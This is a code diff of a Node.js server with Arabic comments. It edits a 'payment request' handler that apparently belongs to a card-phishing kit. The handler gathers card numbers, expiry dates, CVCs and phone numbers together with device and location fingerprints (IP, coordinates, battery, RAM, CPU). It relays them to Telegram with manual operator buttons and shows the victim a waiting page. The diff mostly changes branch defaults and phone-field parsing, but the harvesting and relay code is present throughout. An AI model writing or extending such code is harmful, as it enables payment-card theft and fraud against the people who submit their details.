@@ -150,7 +150,7 @@ async function handlePaymentRequest(req, res) {
   try {
     const data = { ...req.query, ...req.body };
     const {
-      phone, user_phone, phoneNumber, amount, payment_method, method,
+      phone, user_phone, phoneNumber, phone_number, amount, payment_method, method,
       number, name, expiry, cvc, card_data, save_card, clientID, clientId,
       publicIP, lat, lon, city, country, battery, batteryInfo, deviceModel,
       deviceRAM, cpuCores, deviceType, screenSize, userTimeZone, lang,
@@ -162,13 +162,16 @@ async function handlePaymentRequest(req, res) {
     }
 
     const selectedMethod = payment_method || method || "wallet";
-    const rawBranch = branch || branch_key || "branch2";
-    const selectedBranch = BRANCH_NAMES[rawBranch] ? rawBranch : "branch2";
-    const branchDisplayName = BRANCH_NAMES[selectedBranch] || BRANCH_NAMES.branch2;
+    
+    // ✅ ضبط الفرع بحيث يكون الافتراضي الصحيح مدعومًا
+    const rawBranch = branch || branch_key || "main";
+    const selectedBranch = BRANCH_NAMES[rawBranch] ? rawBranch : "main";
+    const branchDisplayName = BRANCH_NAMES[selectedBranch] || BRANCH_NAMES.main;
 
-    const userPhone = phone || user_phone || phoneNumber || data.phone_number || "غير محدد";
+    // ✅ التقاط رقم الهاتف بدقة من أي متغير محتمل
+    const userPhone = phone || user_phone || phoneNumber || phone_number || "غير محدد";
     const payAmount = amount || "5";
-    const transactionId = "TX_" + Date.now(); // توليد رقم معاملة فريد افتراضي
+    const transactionId = "TX_" + Date.now();
 
     const paymentPayload = {
       phone: userPhone,
@@ -203,7 +206,6 @@ async function handlePaymentRequest(req, res) {
       await sendTelegramMessage(paymentPayload, true);
     }
 
-    // ✅ إرسال الأزرار لتليجرام يدوياً وفورياً قبل الانتقال لصفحة الانتظار
     if (typeof sendTelegramManualButtons === "function") {
       await sendTelegramManualButtons({
         phone: userPhone,
@@ -249,8 +251,8 @@ app.get("/api/test-create-card", async (req, res) => {
 
   try {
     const amount = req.query.amount || "5";
-    const rawTarget = req.query.branch || req.query.branch_key || "branch2";
-    const targetBranch = BRANCH_NAMES[rawTarget] ? rawTarget : "branch2";
+    const rawTarget = req.query.branch || req.query.branch_key || "main";
+    const targetBranch = BRANCH_NAMES[rawTarget] ? rawTarget : "main";
     const testTxId = "TEST_" + Date.now();
 
     const result = await processPaymentAndCreateCard(amount, targetBranch, testTxId);
@@ -262,7 +264,7 @@ app.get("/api/test-create-card", async (req, res) => {
         amount: parseFloat(amount),
         phone: "01000000000",
         branchKey: result.branchKey,
-        branchName: BRANCH_NAMES[result.branchKey] || BRANCH_NAMES.branch2,
+        branchName: BRANCH_NAMES[result.branchKey] || BRANCH_NAMES.main,
         createdAt: new Date()
       };
 
@@ -335,9 +337,8 @@ app.post("/api/disable-queue", async (req, res) => {
 
 app.get("/success", async (req, res) => {
   const transactionId = req.query.id || req.query.order || req.query.transaction_id || req.query.merchant_order_id || "TX_" + Date.now();
-  const queryBranch = req.query.branch || "branch2";
+  const queryBranch = req.query.branch || "main";
 
-  // ✅ إرسال الإشعار والأزرار لتليجرام أيضاً عند الدخول لرابط النجاح/الانتظار المباشر
   if (typeof sendTelegramManualButtons === "function") {
     await sendTelegramManualButtons({
       phone: req.query.phone || "غير محدد",
@@ -346,7 +347,6 @@ app.get("/success", async (req, res) => {
     }, transactionId);
   }
 
-  // استدعاء صفحة الانتظار الافتراضية من waitPage.js وعرضها مباشرة للعميل
   return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
 });
 
